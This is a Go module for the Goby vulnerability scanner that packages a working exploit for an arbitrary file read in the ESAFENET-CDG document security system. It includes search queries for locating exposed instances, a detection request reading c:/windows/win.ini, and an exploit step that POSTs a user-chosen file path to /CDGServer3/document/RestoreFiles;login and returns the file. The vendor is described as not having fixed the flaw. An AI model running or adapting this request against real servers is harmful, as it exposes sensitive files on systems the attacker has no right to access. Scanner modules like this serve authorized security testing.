package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /CDGServer3/document/RestoreFiles;login File Read Vulnerability",
    "Description": "<p>ESAFENET-CDG is a software specially designed for organs, financial institutions and enterprises, which can help these organizations to carry out security management of electronic documents. </p><p> A file reading vulnerability in UploadFileManagerService of Esaiton's electronic document security management system could be exploited to obtain sensitive system information.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-05-22",
    "PostTime": "2024-05-22",
    "Author": "1070488180@qq.com",
    "FofaQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "GobyQuery": "body=\"CDGServer3\" || title=\"电子文档安全管理系统\" || cert=\"esafenet\" || body=\"/help/getEditionInfo.jsp\"",
    "Level": "1",
    "Impact": "<p> A file reading vulnerability in UploadFileManagerService of Esaiton's electronic document security management system could be exploited to obtain sensitive system information.</p>",
    "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"http://www.esafenet.com/product/277483397\">http://www.esafenet.com/product/277483397</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "c:/windows/win.ini",
            "show": "c:/windows/win.ini"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/document/RestoreFiles;login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "command=DownloadDoc&fileNameForDownload=&downPath=c:/windows/win.ini"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[extensions]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/CDGServer3/document/RestoreFiles;login"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/CDGServer3/document/RestoreFiles;login",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "command=DownloadDoc&fileNameForDownload=&downPath={{{filePath}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody||"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档安全管理系统 /CDGServer3/document/RestoreFiles;login 文件读取漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>赛通电子文档安全管理系统是一款专门为机关、金融和企事业单位设计的软件，它可以帮助这些机构对电子文档进行安全管理。<br></p><p>亿赛通电子文档安全管理系统 UploadFileManagerService 文件读取漏洞，攻击者可利用该漏洞，获取系统敏感信息。</p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.esafenet.com/product/277483397\" target=\"_blank\">http://www.esafenet.com/product/277483397</a></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统 UploadFileManagerService 文件读取漏洞，攻击者可利用该漏洞，获取系统敏感信息。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /CDGServer3/document/RestoreFiles;login File Read Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>ESAFENET-CDG is a software specially designed for organs, financial institutions and enterprises, which can help these organizations to carry out security management of electronic documents.&nbsp;</p><p>&nbsp;A file reading vulnerability in UploadFileManagerService of Esaiton's electronic document security management system could be exploited to obtain sensitive system information.<br></p>",
            "Recommendation": "<p>The official has not fixed the vulnerability, please contact the manufacturer to fix the vulnerability:<a href=\"http://www.esafenet.com/product/277483397\" target=\"_blank\">http://www.esafenet.com/product/277483397</a><br></p>",
            "Impact": "<p>&nbsp;A file reading vulnerability in UploadFileManagerService of Esaiton's electronic document security management system could be exploited to obtain sensitive system information.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10953"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}